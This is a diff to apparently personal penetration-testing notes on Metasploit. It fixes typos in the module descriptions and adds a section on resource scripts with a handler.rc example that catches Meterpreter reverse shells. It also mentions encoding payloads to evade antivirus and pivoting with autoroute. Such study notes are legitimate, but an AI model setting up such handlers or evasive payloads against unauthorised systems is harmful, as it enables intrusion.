@@ -5,8 +5,8 @@ The Metasploit Project is a computer security project that provides data about s
 The Metasploit project includes anti-forensics and remediation tools, some of which are built into the Metasploit Framework. Metasploit comes pre-installed on the Kali Linux operating system.
 
  ### Modules
- - Exploit - A module that is used to take advantage of vulnerability and is typically paired with a pyload.
- - Payload - Code that is deliverd by MSF and remotely executed ont he target after successful expllitation. An example of a payload is a revers shell that initiates a connection from the target system back to the attacker.
+ - Exploit - A module that is used to take advantage of vulnerability and is typically paired with a payload.
+ - Payload - Code that is delivered by MSF and remotely executed on the target after successful exploitation. An example of a payload is a revers shell that initiates a connection from the target system back to the attacker.
  - Encoder - Used to encode payloads in order to avoid AV detection. fro example, shikata_ga_nai is used to encode Windows payloads.
  - NOPS - Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed
  - Auxiliary - Module that is used to perform additional functionality like port scanning and enumeration.
@@ -69,6 +69,29 @@ run
 When you are doing pivoting and have a meterpreter session you can add the new IP with
 `run autoroute -s <subnet_ip>`
 Remember to add 1 to the last number
+
+### Automating metasploit with resource scripts
+They operate similarly to batch scripts, whereby, you can specify a  set of msfconsole commands that you want to execute sequentially.
+
+You can load the script with msfconsole and automate the execution of the commands yous specified din the resource script.
+
+We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.
+
+The resources are located in `/usr/share/metasploit-framewokr/scripts/resource`
+
+You can write your own script like this
+
+```bash
+#handler.rc
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhosts 10.10.10.1
+set lport 1234
+run
+```
+
+You can load it in msfconsole `msfconsole -r handler.rc`
+
 
 ### WEB modules
 - auxiliary/scanner/http/apache_userdir_enum
